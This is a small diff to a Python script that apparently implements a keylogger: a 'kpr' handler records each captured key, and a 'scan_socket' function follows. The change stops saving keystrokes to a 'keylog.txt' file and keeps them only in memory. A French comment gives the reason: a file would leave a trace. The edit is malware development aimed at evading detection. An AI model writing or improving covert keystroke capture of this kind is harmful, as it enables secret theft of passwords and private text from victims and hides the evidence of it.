@@ -57,9 +57,9 @@ def parse(srt):
 
 def kpr(key):
     global TXT_GLOB
-    with open("keylog.txt", "a") as f:
-        f.write(parse(str(key)))
-        TXT_GLOB += parse(str(key))
+    #with open("keylog.txt", "a") as f: ## pas de fichier ca laisse une trace c'est nul
+        #f.write(parse(str(key)))
+    TXT_GLOB += parse(str(key))
 
 
 def scan_socket(port):
